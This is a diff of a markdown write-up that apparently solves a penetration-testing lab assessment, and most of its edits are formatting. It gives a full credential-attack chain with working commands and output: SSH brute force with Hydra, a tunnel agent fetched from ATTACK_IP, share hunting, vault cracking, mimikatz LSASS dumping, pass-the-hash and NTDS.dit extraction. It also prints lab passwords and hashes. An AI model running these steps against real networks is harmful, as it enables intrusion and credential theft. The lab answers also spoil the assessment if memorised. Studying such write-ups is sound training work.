@@ -1,4 +1,4 @@
-# Skills Assessment - Password Attacks Workflow
+# 🎯 Skills Assessment - Complete Password Attacks Workflow
 
 ## 🎯 Overview
 
@@ -9,31 +9,35 @@ This **Skills Assessment** demonstrates a **complete penetration testing workflo
 ## 🏗️ Attack Chain Architecture
 
 ### Complete Workflow
+
 ```
 Initial Recon → SSH Brute Force → Credential Hunting → Pivoting → Internal Enum → Share Analysis → Password Vault Cracking → Privilege Escalation → Domain Compromise
 ```
 
 ### Key Learning Objectives
-- **Username enumeration** with username-anarchy
-- **SSH brute forcing** with Hydra
-- **Credential hunting** in bash history
-- **Network pivoting** with ligolo-ng
-- **Internal reconnaissance** with NetExec
-- **Share credential hunting** with Snaffler
-- **Password vault cracking** with hashcat
-- **LSASS memory dumping** with mimikatz
-- **Domain compromise** via NTDS.dit extraction
 
----
+* **Username enumeration** with username-anarchy
+* **SSH brute forcing** with Hydra
+* **Credential hunting** in bash history
+* **Network pivoting** with ligolo-ng
+* **Internal reconnaissance** with NetExec
+* **Share credential hunting** with Snaffler
+* **Password vault cracking** with hashcat
+* **LSASS memory dumping** with mimikatz
+* **Domain compromise** via NTDS.dit extraction
+
+***
 
 ## 🔍 Phase 1: Initial Reconnaissance & Foothold
 
 ### Target Information
-- **Target IP**: Single IP address provided
-- **Known Information**: Betty Jayde (name), Texas123!@# (potential password)
-- **Goal**: Gain initial access to the network
+
+* **Target IP**: Single IP address provided
+* **Known Information**: Betty Jayde (name), Texas123!@# (potential password)
+* **Goal**: Gain initial access to the network
 
 ### Network Enumeration
+
 ```bash
 # Initial port scan
 nmap 10.129.234.116
@@ -50,6 +54,7 @@ PORT   STATE SERVICE
 ### Username Generation with Username-Anarchy
 
 #### Installation and Setup
+
 ```bash
 # Clone username-anarchy tool
 git clone https://github.com/urbanadventurer/username-anarchy.git
@@ -60,6 +65,7 @@ cd username-anarchy
 ```
 
 #### Generated Username Patterns
+
 ```bash
 # Common corporate patterns generated:
 betty
@@ -77,6 +83,7 @@ jbetty
 ### SSH Brute Force Attack
 
 #### Hydra SSH Attack
+
 ```bash
 # Brute force SSH with generated usernames and known password
 hydra -L user.list -p 'Texas123!@#' ssh://10.129.234.116
@@ -91,6 +98,7 @@ Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
 ```
 
 #### Successful SSH Access
+
 ```bash
 # Connect with discovered credentials
 ssh jbetty@10.129.234.116
@@ -100,11 +108,12 @@ Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
 jbetty@DMZ01:~$
 ```
 
----
+***
 
 ## 🕵️ Phase 2: Credential Hunting
 
 ### Bash History Analysis
+
 ```bash
 # Search for credentials in user directories
 grep 'pass' -r /home/ 2>/dev/null
@@ -115,17 +124,19 @@ grep 'pass' -r /home/ 2>/dev/null
 ```
 
 ### Extracted Credentials
-- **Username**: hwilliam
-- **Password**: dealer-screwed-gym1
-- **Target**: file01 (internal network)
 
----
+* **Username**: hwilliam
+* **Password**: dealer-screwed-gym1
+* **Target**: file01 (internal network)
+
+***
 
 ## 🌐 Phase 3: Network Pivoting
 
 ### Ligolo-ng Setup
 
 #### Download and Extract
+
 ```bash
 # On attack host - download ligolo-ng
 wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
@@ -136,6 +147,7 @@ tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
 ```
 
 #### File Transfer Setup
+
 ```bash
 # Start HTTP server on attack host
 python3 -m http.server
@@ -145,6 +157,7 @@ jbetty@DMZ01:~$ wget http://ATTACK_IP:8000/agent
 ```
 
 #### Proxy and Agent Setup
+
 ```bash
 # Terminal 1: Start proxy on attack host
 sudo ./proxy -selfcert
@@ -155,6 +168,7 @@ jbetty@DMZ01:~$ ./agent -connect ATTACK_IP:11601 --ignore-cert
 ```
 
 #### Network Routing Configuration
+
 ```bash
 # In ligolo-ng console:
 ligolo-ng » session
@@ -166,11 +180,12 @@ ligolo-ng » session
 ? Start the tunnel? Yes
 ```
 
----
+***
 
 ## 🔍 Phase 4: Internal Network Reconnaissance
 
 ### Target Enumeration
+
 ```bash
 # Create target list for internal network
 cat << EOF > hosts
@@ -182,6 +197,7 @@ EOF
 ```
 
 ### Credential Validation with NetExec
+
 ```bash
 # Test discovered credentials against internal targets
 netexec rdp hosts -u hwilliam -p 'dealer-screwed-gym1'
@@ -196,16 +212,18 @@ RDP         172.16.119.11   3389   DC01             [+] nexura.htb\hwilliam:deal
 ```
 
 ### RDP Connection with File Sharing
+
 ```bash
 # Connect to JUMP01 with shared folder
 xfreerdp /v:172.16.119.7 /u:hwilliam /p:'dealer-screwed-gym1' /dynamic-resolution /drive:linux,.
 ```
 
----
+***
 
 ## 📂 Phase 5: Network Share Analysis
 
 ### Share Enumeration
+
 ```bash
 # Enumerate available shares
 netexec smb hosts -u hwilliam -p 'dealer-screwed-gym1' --shares
@@ -222,6 +240,7 @@ SMB         172.16.119.10   445    FILE01           TRANSFER        READ,WRITE
 ### Snaffler Automated Credential Discovery
 
 #### Tool Transfer and Execution
+
 ```bash
 # Download Snaffler to attack host
 wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.198/Snaffler.exe
@@ -232,6 +251,7 @@ C:\Users\hwilliam\Desktop\Snaffler.exe -u -s -n FILE01.nexura.htb
 ```
 
 #### Snaffler Results
+
 ```cmd
 [NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Share] {Green}<\\FILE01.nexura.htb\HR>(R)
 [NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Share] {Green}<\\FILE01.nexura.htb\PRIVATE>(R)
@@ -242,11 +262,12 @@ C:\Users\hwilliam\Desktop\Snaffler.exe -u -s -n FILE01.nexura.htb
 [NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:07Z [File] {Green}<KeepNameContainsGreen|R|passw|1.1kB|2025-04-29 15:09:57Z>(\\FILE01.nexura.htb\HR\Archive\Employee-Passwords_OLD.psafe3) Employee-Passwords_OLD.psafe3
 ```
 
----
+***
 
 ## 🔓 Phase 6: Password Vault Cracking
 
 ### Password Safe File Extraction
+
 ```bash
 # Connect to HR share and download the vault
 smbclient -U nexura.htb\\hwilliam '\\172.16.119.10\HR'
@@ -259,6 +280,7 @@ smb: \Archive\> get Employee-Passwords_OLD.psafe3
 ### Hashcat Password Vault Cracking
 
 #### Identify Hash Mode
+
 ```bash
 # Find appropriate hashcat mode for Password Safe v3
 hashcat --example-hashes | grep -i safe -A 5
@@ -272,6 +294,7 @@ Password.Len.Max....: 256
 ```
 
 #### Crack Password Vault
+
 ```bash
 # Crack with rockyou wordlist
 hashcat -m 5200 Employee-Passwords_OLD.psafe3 /usr/share/wordlists/rockyou.txt.gz
@@ -285,6 +308,7 @@ Hash.Mode........: 5200 (Password Safe v3)
 ```
 
 ### Password Vault Access
+
 ```bash
 # Access vault with cracked password: "michaeljackson"
 # Contents revealed:
@@ -292,11 +316,12 @@ Hash.Mode........: 5200 (Password Safe v3)
 # - stom:fails-nibble-disturb4
 ```
 
----
+***
 
 ## ⚔️ Phase 7: Privilege Escalation
 
 ### Credential Validation
+
 ```bash
 # Test new credentials against internal network
 netexec winrm hosts -u bdavid -p 'caramel-cigars-reply1'
@@ -306,6 +331,7 @@ WINRM       172.16.119.7    5985   JUMP01           [+] nexura.htb\bdavid:carame
 ```
 
 ### Administrative Access via RDP
+
 ```bash
 # Connect as administrator
 xfreerdp /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' /dynamic-resolution /drive:linux,.
@@ -314,6 +340,7 @@ xfreerdp /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' /dynamic-resolutio
 ### Mimikatz LSASS Dumping
 
 #### Tool Transfer
+
 ```bash
 # Copy mimikatz to attack host
 cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
@@ -321,6 +348,7 @@ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
 ```
 
 #### Memory Credential Extraction
+
 ```cmd
 # Run from elevated command prompt
 C:\Users\bdavid\Desktop\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
@@ -337,11 +365,12 @@ Domain            : NEXURA
          * NTLM     : 21ea958524cfd9a7791737f8d2f764fa
 ```
 
----
+***
 
 ## 👑 Phase 8: Domain Compromise
 
 ### Pass-the-Hash Attack
+
 ```bash
 # Test extracted NTLM hash against domain targets
 netexec smb hosts -u stom -H 21ea958524cfd9a7791737f8d2f764fa
@@ -352,6 +381,7 @@ SMB         172.16.119.11   445    DC01             [+] nexura.htb\stom:21ea9585
 ```
 
 ### NTDS.dit Extraction
+
 ```bash
 # Extract domain controller database
 netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa --ntds --user Administrator
@@ -361,16 +391,18 @@ SMB         172.16.119.11   445    DC01             [+] Dumping the NTDS, this c
 SMB         172.16.119.11   445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:{ADMINISTRATOR_HASH}:::
 ```
 
----
+***
 
 ## 🎯 Skills Assessment Questions
 
 ### Question 1: NEXURA\Administrator NTLM Hash
+
 **Answer**: `{Extract from NTDS.dit output}`
 
 **Methodology**:
+
 1. ✅ Initial SSH brute force → jbetty:Texas123!@#
-2. ✅ Credential hunting → hwilliam:dealer-screwed-gym1  
+2. ✅ Credential hunting → hwilliam:dealer-screwed-gym1
 3. ✅ Network pivoting → Access to internal network
 4. ✅ Share analysis → Password vault discovery
 5. ✅ Vault cracking → bdavid credentials
@@ -378,24 +410,26 @@ SMB         172.16.119.11   445    DC01             Administrator:500:aad3b435b5
 7. ✅ Pass-the-Hash → stom account compromise
 8. ✅ Domain compromise → NTDS.dit extraction
 
----
+***
 
 ## 🔧 Tools Integration Summary
 
 ### Tools Used in Workflow
-| Phase | Tool | Purpose | Alternative |
-|-------|------|---------|-------------|
-| **Recon** | username-anarchy | Username generation | Manual creation |
-| **Initial** | Hydra | SSH brute force | NetExec ssh |
-| **Hunting** | grep | Credential discovery | Manual file review |
-| **Pivoting** | ligolo-ng | Network tunneling | Chisel, SSH tunnels |
-| **Recon** | NetExec | Service enumeration | Nmap, custom scripts |
-| **Shares** | Snaffler | Automated credential hunting | PowerHuntShares, manual |
-| **Cracking** | hashcat | Password vault cracking | John the Ripper |
-| **Memory** | mimikatz | LSASS credential extraction | pypykatz |
-| **Domain** | NetExec | NTDS.dit extraction | secretsdump.py |
+
+| Phase        | Tool             | Purpose                      | Alternative             |
+| ------------ | ---------------- | ---------------------------- | ----------------------- |
+| **Recon**    | username-anarchy | Username generation          | Manual creation         |
+| **Initial**  | Hydra            | SSH brute force              | NetExec ssh             |
+| **Hunting**  | grep             | Credential discovery         | Manual file review      |
+| **Pivoting** | ligolo-ng        | Network tunneling            | Chisel, SSH tunnels     |
+| **Recon**    | NetExec          | Service enumeration          | Nmap, custom scripts    |
+| **Shares**   | Snaffler         | Automated credential hunting | PowerHuntShares, manual |
+| **Cracking** | hashcat          | Password vault cracking      | John the Ripper         |
+| **Memory**   | mimikatz         | LSASS credential extraction  | pypykatz                |
+| **Domain**   | NetExec          | NTDS.dit extraction          | secretsdump.py          |
 
 ### Command Reference Quick Sheet
+
 ```bash
 # Username generation
 ./username-anarchy FirstName LastName > users.txt
@@ -425,11 +459,12 @@ netexec smb targets.txt -u user -H ntlm_hash
 netexec smb dc_ip -u user -H hash --ntds
 ```
 
----
+***
 
 ## 💡 Key Learning Points
 
 ### Attack Chain Insights
+
 1. **OSINT drives initial success** - Real names lead to valid usernames
 2. **Credential reuse is common** - Users often reuse passwords across systems
 3. **Network shares contain secrets** - IT environments accumulate credentials
@@ -439,6 +474,7 @@ netexec smb dc_ip -u user -H hash --ntds
 7. **Domain compromise = total control** - NTDS.dit contains every domain account
 
 ### Defensive Lessons
+
 1. **Monitor authentication failures** - Detect brute force attempts
 2. **Secure credential storage** - Use proper secrets management
 3. **Network segmentation** - Prevent lateral movement
@@ -448,12 +484,13 @@ netexec smb dc_ip -u user -H hash --ntds
 7. **Domain controller hardening** - Protect NTDS.dit access
 
 ### Methodology Validation
-- **Systematic approach** - Each phase builds on previous discoveries
-- **Tool integration** - Multiple tools working together effectively
-- **Real-world applicability** - Techniques mirror actual penetration tests
-- **Complete coverage** - From foothold to domain admin
-- **Practical skills** - Hands-on experience with industry tools
 
----
+* **Systematic approach** - Each phase builds on previous discoveries
+* **Tool integration** - Multiple tools working together effectively
+* **Real-world applicability** - Techniques mirror actual penetration tests
+* **Complete coverage** - From foothold to domain admin
+* **Practical skills** - Hands-on experience with industry tools
 
-*This Skills Assessment demonstrates the complete password attacks workflow, combining reconnaissance, brute forcing, credential hunting, privilege escalation, and domain compromise techniques in a realistic penetration testing scenario.* 
+***
+
+_This Skills Assessment demonstrates the complete password attacks workflow, combining reconnaissance, brute forcing, credential hunting, privilege escalation, and domain compromise techniques in a realistic penetration testing scenario._
